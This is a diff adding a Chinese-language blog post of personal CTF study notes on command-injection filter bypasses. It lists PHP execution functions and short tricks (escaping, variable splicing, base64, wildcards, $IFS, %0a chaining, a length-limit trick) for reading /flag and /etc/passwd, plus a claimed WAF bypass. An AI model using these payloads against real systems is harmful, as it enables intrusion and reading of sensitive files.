@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="参考: https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44657899&#x2F;article&#x2F;details&#x2F;107676580  常见函数12345678system()passthru()exec()shell_exec()proc_open()popen()pcntl_exec()dl()  绕过关键词过滤双写绕过ccatat -&gt; cat 大小写绕过&#96;&#96;&#96;cA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="简单命令执行的学习">
+<meta property="og:url" content="https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="m4o9&#39;s blog">
+<meta property="og:description" content="参考: https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44657899&#x2F;article&#x2F;details&#x2F;107676580  常见函数12345678system()passthru()exec()shell_exec()proc_open()popen()pcntl_exec()dl()  绕过关键词过滤双写绕过ccatat -&gt; cat 大小写绕过&#96;&#96;&#96;cA">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-09-08T08:37:45.000Z">
+<meta property="article:modified_time" content="2022-09-12T08:43:33.066Z">
+<meta property="article:author" content="m4o9">
+<meta property="article:tag" content="rce">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>简单命令执行的学习</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/m4o9">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/09/12/%E5%88%9D%E6%8E%A2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/09/07/hello-world/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&text=简单命令执行的学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=简单命令执行的学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&is_video=false&description=简单命令执行的学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=简单命令执行的学习&body=Check out this article: https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=简单命令执行的学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=简单命令执行的学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=简单命令执行的学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=简单命令执行的学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&name=简单命令执行的学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://m4o9.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/&t=简单命令执行的学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">常见函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">关键词过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.1.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.2.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E6%9B%BF%E6%96%B9%E6%A1%88"><span class="toc-number">2.1.3.</span> <span class="toc-text">代替方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E4%B9%89%E7%AC%A6"><span class="toc-number">2.1.4.</span> <span class="toc-text">转义符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.1.5.</span> <span class="toc-text">变量拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.6.</span> <span class="toc-text">内联执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.7.</span> <span class="toc-text">编码进制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">2.1.8.</span> <span class="toc-text">通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E5%8F%98%E9%87%8F"><span class="toc-number">2.1.9.</span> <span class="toc-text">空变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%A1%88"><span class="toc-number">2.1.10.</span> <span class="toc-text">读文件替代方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dir%E5%92%8Cls%E7%9A%84%E6%9B%BF%E4%BB%A3"><span class="toc-number">2.1.11.</span> <span class="toc-text">dir和ls的替代</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">空格过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">2.3.</span> <span class="toc-text">过滤目录分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-amp"><span class="toc-number">2.4.</span> <span class="toc-text">过滤 | &amp; ;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%A1%88"><span class="toc-number">2.4.1.</span> <span class="toc-text">替代方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gt-%E6%9B%BF%E4%BB%A3%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA"><span class="toc-number">2.4.2.</span> <span class="toc-text">?&gt;替代最后一个;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">2.5.</span> <span class="toc-text">字符串长度限制</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        简单命令执行的学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">m4o9</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-09-08T08:37:45.000Z" itemprop="datePublished">2022-09-08</time>
+        
+        (Updated: <time datetime="2022-09-12T08:43:33.066Z" itemprop="dateModified">2022-09-12</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/%E7%AC%94%E8%AE%B0/">笔记</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/rce/" rel="tag">rce</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>参考: <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/107676580">https://blog.csdn.net/qq_44657899/article/details/107676580</a></p>
+</blockquote>
+<h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">dl</span>()</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p><code>ccatat -&gt; cat</code></p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>&#96;&#96;&#96;cAt&#96;&#96;</p>
+<h3 id="代替方案"><a href="#代替方案" class="headerlink" title="代替方案"></a>代替方案</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /flag <span class="number">2</span>&gt;%<span class="number">261</span>  <span class="comment">//报错出文件内容</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fl\ag</span><br><span class="line"><span class="built_in">cat</span> fl<span class="string">&#x27;&#x27;</span>ag</span><br></pre></td></tr></table></figure>
+
+<h3 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag.php;<span class="built_in">cat</span>$IFS$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> `<span class="built_in">ls</span>` </span><br><span class="line"><span class="comment"># 等同于--&gt;</span></span><br><span class="line"><span class="built_in">cat</span> flag.php;<span class="built_in">cat</span> index.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="编码进制绕过"><a href="#编码进制绕过" class="headerlink" title="编码进制绕过"></a>编码进制绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root~]<span class="comment">#  echo &#x27;cat&#x27; | base64</span></span><br><span class="line">Y2F0wqAK</span><br><span class="line">[root~]<span class="comment">#  `echo &#x27;Y2F0wqAK&#x27; | base64 -d` 1.txt</span></span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+
+<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) 利用正则匹配绕过</span><br><span class="line">[root~]<span class="comment"># cat /???/pass*</span></span><br><span class="line">    </span><br><span class="line">2) 例如过滤/etc/passwd中的etc，利用未初始化变量，使用<span class="variable">$u</span>绕过</span><br><span class="line">[root~]<span class="comment"># cat /etc$u/passwd</span></span><br><span class="line">    </span><br><span class="line">备注：此方法能绕CloudFlare WAF（出自：https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/）</span><br></pre></td></tr></table></figure>
+
+<h3 id="空变量"><a href="#空变量" class="headerlink" title="空变量"></a>空变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用$*和<span class="variable">$@</span>，<span class="variable">$x</span>,<span class="variable">$&#123;x&#125;</span></span><br><span class="line">ca$*t ./flag</span><br><span class="line">ca<span class="variable">$@t</span> ./flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="读文件替代方案"><a href="#读文件替代方案" class="headerlink" title="读文件替代方案"></a>读文件替代方案</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl file:///flag</span><br><span class="line">strings /flag</span><br><span class="line"><span class="built_in">uniq</span> -c/etc/passwd</span><br><span class="line">bash -v /etc/passwd</span><br><span class="line">rev /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="dir和ls的替代"><a href="#dir和ls的替代" class="headerlink" title="dir和ls的替代"></a>dir和ls的替代</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -- 列出当前目录下的文件以及子目录所有文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><ul>
+<li>%09（url传递）(<code>cat%09flag.php</code>)</li>
+<li>${IFS}</li>
+<li>$IFS$9</li>
+<li>&lt;&gt;（<code>cat&lt;&gt;/flag</code>）</li>
+<li>&lt;（<code>cat&lt;/flag</code>）</li>
+<li>{cat,flag}</li>
+</ul>
+<h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="built_in">cd</span> flag_is_here;<span class="built_in">cat</span> *</span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤-amp"><a href="#过滤-amp" class="headerlink" title="过滤 | &amp; ;"></a>过滤 | &amp; ;</h2><h3 id="替代方案"><a href="#替代方案" class="headerlink" title="替代方案"></a>替代方案</h3><p>可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号</p>
+<table>
+<thead>
+<tr>
+<th><strong>注入算子</strong></th>
+<th><strong>注入字符</strong></th>
+<th><strong>URL 编码字符</strong></th>
+<th><strong>执行的命令</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>回车符</td>
+<td><code>enter</code></td>
+<td><code>%0d</code></td>
+<td>&#x2F;</td>
+</tr>
+<tr>
+<td>分号</td>
+<td><code>;</code></td>
+<td><code>%3b</code></td>
+<td>两个都(cmd不行 powershell可以)</td>
+</tr>
+<tr>
+<td>换行</td>
+<td><code>\n</code></td>
+<td><code>%0a</code></td>
+<td>两个都</td>
+</tr>
+<tr>
+<td>后台进程</td>
+<td><code>&amp;</code></td>
+<td><code>%26</code></td>
+<td>两者（通常首先显示第二个输出）</td>
+</tr>
+<tr>
+<td>管道</td>
+<td>&#96;</td>
+<td>&#96;</td>
+<td><code>%7c</code></td>
+</tr>
+<tr>
+<td>和</td>
+<td><code>&amp;&amp;</code></td>
+<td><code>%26%26</code></td>
+<td>两者（仅当第一次成功时）</td>
+</tr>
+<tr>
+<td>或者</td>
+<td>&#96;</td>
+<td></td>
+<td>&#96;</td>
+</tr>
+<tr>
+<td>Sub-shell</td>
+<td><code>``</code></td>
+<td><code>%60%60</code></td>
+<td>两者（仅限 Linux）</td>
+</tr>
+<tr>
+<td>Sub-shell</td>
+<td><code>$()</code></td>
+<td><code>%24%28%29</code></td>
+<td>两者（仅限 Linux）</td>
+</tr>
+</tbody></table>
+<h3 id="gt-替代最后一个"><a href="#gt-替代最后一个" class="headerlink" title="?&gt;替代最后一个;"></a>?&gt;替代最后一个;</h3><p>在php中可以用 <code>?&gt;</code> 来代替最后一个 <code>; </code>因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号。</p>
+<h2 id="字符串长度限制"><a href="#字符串长度限制" class="headerlink" title="字符串长度限制"></a>字符串长度限制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面<span class="comment"># echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span></span><br><span class="line">root@kali:~/桌面<span class="comment"># touch &quot;ag&quot;</span></span><br><span class="line">root@kali:~/桌面<span class="comment"># touch &quot;fl\\&quot;</span></span><br><span class="line">root@kali:~/桌面<span class="comment"># touch &quot;t \\&quot;</span></span><br><span class="line">root@kali:~/桌面<span class="comment"># touch &quot;ca\\&quot;</span></span><br><span class="line">root@kali:~/桌面<span class="comment"># ls -t</span></span><br><span class="line"><span class="string">&#x27;ca\&#x27;</span>  <span class="string">&#x27;t \&#x27;</span>  <span class="string">&#x27;fl\&#x27;</span>   ag   flag</span><br><span class="line">root@kali:~/桌面<span class="comment"># ls -t &gt;a     #将 ls -t 内容写入到a文件中</span></span><br><span class="line">root@kali:~/桌面<span class="comment"># sh a</span></span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>
+
+<p><code>\ </code>是指换行<br><code>ls -t </code>将文件按时间排序输出<br><code>sh </code>命令可以从一个文件中读取命令来执行</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archive</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/m4o9">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">常见函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">关键词过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.1.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.2.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E6%9B%BF%E6%96%B9%E6%A1%88"><span class="toc-number">2.1.3.</span> <span class="toc-text">代替方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E4%B9%89%E7%AC%A6"><span class="toc-number">2.1.4.</span> <span class="toc-text">转义符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.1.5.</span> <span class="toc-text">变量拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.6.</span> <span class="toc-text">内联执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.7.</span> <span class="toc-text">编码进制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">2.1.8.</span> <span class="toc-text">通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E5%8F%98%E9%87%8F"><span class="toc-number">2.1.9.</span> <span class="toc-text">空变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%A1%88"><span class="toc-number">2.1.10.</span> <span class="toc-text">读文件替代方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dir%E5%92%8Cls%E7%9A%84%E6%9B%BF%E4%BB%A3"><span class="toc-number">2.1.11.</span> <span class="toc-text">dir和ls的替代</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">空格过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">2.3.</span> <span class="toc-text">过滤目录分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-amp"><span class="toc-number">2.4.</span> <span class="toc-text">过滤 | &amp; ;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%A1%88"><span class="toc-number">2.4.1.</span> <span class="toc-text">替代方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gt-%E6%9B%BF%E4%BB%A3%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA"><span class="toc-number">2.4.2.</span> <span class="toc-text">?&gt;替代最后一个;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">2.5.</span> <span class="toc-text">字符串长度限制</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
